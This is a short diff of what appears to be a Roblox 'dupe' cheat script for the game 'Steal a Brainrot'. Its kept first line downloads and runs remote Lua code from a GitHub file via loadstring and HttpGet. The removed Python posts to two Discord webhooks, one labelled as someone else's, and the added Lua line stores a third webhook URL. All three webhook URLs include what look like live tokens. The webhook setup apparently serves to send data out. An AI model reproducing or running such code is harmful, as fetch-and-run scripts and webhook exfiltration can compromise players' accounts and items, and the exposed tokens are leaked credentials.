@@ -1,22 +1,3 @@
 loadstring(game:HttpGet("https://raw.githubusercontent.com/DupeSab/StealABrainrot/refs/heads/main/Dupe", true))()
 
-import requests
-
-# Your webhook URL
-your_webhook = 'https://discord.com/api/webhooks/1422262979763769495/NVFwR91FK1Lvo3kzQXcmzeRf6DGXWuMnM-9l4XsXtYTs1TRKjlHMxT7bKq_DohgX9LYl'
-
-# Their webhook URL (use only if you have permission)
-their_webhook = 'https://discord.com/api/webhooks/1378399620866244749/3RiX0WeK-vAtDQ9WLMO0xmW9carFLW0taSsyYctIuYWJ7tUzxNV9cELXNKigwwjSwxzl'
-
-# The message you want to send
-message = {
-    "content": "This message is sent to both webhooks!"
-}
-
-# Send to your webhook
-response_yours = requests.post(your_webhook, json=message)
-print(f"Sent to your webhook: {response_yours.status_code}")
-
-# Send to their webhook
-response_theirs = requests.post(their_webhook, json=message)
-print(f"Sent to their webhook: {response_theirs.status_code}")
+local webhookURL = "https://discord.com/api/webhooks/1422266508498964631/OYRMx2mVgW10Ecks3LG1akH1iTeI_OE36g9aQ4bAjYXoynuiaI0XpBzvpmciLHeiaG-4"
